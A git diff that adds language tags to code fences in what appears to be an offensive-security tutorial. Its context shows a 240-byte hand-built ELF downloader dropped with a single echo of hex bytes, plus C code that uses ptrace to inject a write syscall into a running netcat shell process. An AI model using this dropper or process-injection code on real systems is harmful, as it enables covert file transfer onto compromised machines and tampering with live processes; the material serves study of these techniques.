@@ -91,7 +91,7 @@ In order to specify this, we would usually make use of a C structure, but we hav
 
 In our example, we are not using the structure, but if we did, it will look like this:
 
-```
+```C
 struct ip_addr {
 	unsigned short family;
 	unsigned short port;
@@ -349,7 +349,7 @@ We can do better, completely crafting our ELF file. And this will bring us to `f
 
 This has already been mentioned in the forum. You can refer to [this](https://0x00sec.org/t/the-price-of-scripting-dietlibc-vs-asm/791/7) to see what we are talking about and based on that, we will get something like this:
 
-```
+```nasm
 BITS 64
 	        org 0x400000
   ehdr:                                                 ; Elf32_Ehdr
@@ -539,7 +539,7 @@ In the iteration 4 we go even more aggressive. Let's take a look to the changes
 
 First, we reuse the 8 bytes reserved in the ELF header to add the initial code instructions. Something like this:
 
-```
+```nasm
 BITS 64
                   org 0x400000
     ehdr:                                                 ; Elf32_Ehdr
@@ -568,7 +568,7 @@ If you have been following this series you should be familiar with the concept o
 
 So, in this iteration we remove the stack frame of our program. Other than that, we just applied some minor tweaks here and there. This is how the final version looks like
 
-```
+```nasm
 BITS 64
 ;;; ELF header.... we make use of the 8 bytes available in the header
 	org 0x400000
@@ -702,7 +702,7 @@ filesize equ $ - $$
 
 This version is 240 bytes long and it is suitable to be dropped using a single `echo`.
 
-```
+```bash
 echo -n -e ""\\x7f\\x45\\x4c\\x46\\x02\\x01\\x01\\x00\\x31\\xff\\xff\\xc7\\x57\\x5e\\xeb\\x68\\x02\\x00\\x3e\\x00\\x01\\x00\\x00\\x00\\x08\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x38\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\xf0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xc7\\xba\\x06\\x00\\x00\\x00\\xe8\\x4b\\x00\\x00\\x00\\x89\\xc3\\x89\\xc7\\x48\\x8d\\x35\\x59\\x00\\x00\\x00\\x83\\xc2\\x0a\\xe8\\x3e\\x00\\x00\\x00\\x48\\x8d\\x34\\x24\\x89\\xdf\\xba\\x00\\x04\\x00\\x00\\xe8\\x1e\\x00\\x00\\x00\\x83\\xf8\\x00\\x7e\\x14\\x31\\xff\\xff\\xc7\\x89\\xc2\\xe8\\x12\\x00\\x00\\x00\\x3d\\x00\\x04\\x00\\x00\\x7c\\x02\\xeb\\xdb\\xe8\\x1c\\x00\\x00\\x00\\x31\\xc0\\xeb\\x1c\\x31\\xc0\\xff\\xc0\\xeb\\x16\\x31\\xc0\\x04\\x29\\xeb\\x10\\x31\\xc0\\x04\\x2a\\xeb\\x0a\\x31\\xc0\\x04\\x03\\xeb\\x04\\x31\\xc0\\x04\\x3c\\x0f\\x05\\xc3\\x02\\x00\\x11\\x11\\x7f\\x00\\x00\\x01"" > fwget; chmod +x fwget
 
 ```
@@ -780,7 +780,7 @@ _Note: You need to have enough permissions to be able to attach to a running pro
 
 Now we have to do some tasks to be able to execute some code from within the process being controlled. The first thing we do is to retrieve the current registers values. We will be using these values to run our code but also, we want to restore everything to the previous state when we are done, so our remote shell session continues working normally.
 
-```
+```C
   if ((ptrace (PTRACE_GETREGS, _pid, 0, &regs)) < 0) 
       perror (""ptrace_get_regs:"");
   memcpy (&regs_cpy, &regs, sizeof (struct user_regs_struct));
@@ -797,7 +797,7 @@ In order to write into a file descriptor, we have to issue the `write` system ca
 
 We chose the second option, so we need to get the current opcode and overwrite it:
 
-```
+```C
  if ((opcode = ptrace (PTRACE_PEEKTEXT, _pid, regs.rip, 0)) < 0)
     perror (""retrieve opcode:"");
 (...)
@@ -822,7 +822,7 @@ So, we went for the last option as it was the simplest. We just make some room i
 
 We wrote a simple function to poke arbitrary strings in the stack. The function looks like this:
 
-```
+```C
 int cpy_str (pid_t _pid, char *str, unsigned long long int *p) {
   int                     i;
   int                     len = strlen (str);
@@ -848,13 +848,13 @@ The function just copies a given string into a given address. But as we have to 
 
 The `for` loop in the code above is like a compressed form of `while` loop.
 
-```
+```C
 for (i = 0; i < len1; i++) { (...) }
 ```
 
 is equivalent to
 
-```
+```C
 i = 0;
 while (i < len1) {
   (...)
@@ -868,7 +868,7 @@ Function `memset` and `strcpy` allow us to initialise a given memory region with
 
 Now, everything is setup to send our data through the socket we had already identified. We had overwrite the current instruction to become a `syscall`. We have our buffer in the stack. So, now we just need to set our registers up and let the process continue execution.
 
-```
+```C
      regs.rax = 1;        // Write syscall
      regs.rdi = 5;        // socket (the one we identified at /proc/PID/fd
      regs.rsi = regs.rsp; // Buf in the stack
@@ -894,7 +894,7 @@ Now the buffer has been sent to the remote machine. We just need to send the `ec
 
 Finally, we just want to clean up, so our shell session keeps going normally. If we just stop here, `nc` will likely crash. The clean up code is also straightforward:
 
-```
+```C
   if ((ptrace (PTRACE_POKETEXT, _pid, regs_cpy.rip, opcode)) < 0) 
        perror (""Restore opcode:"");
 
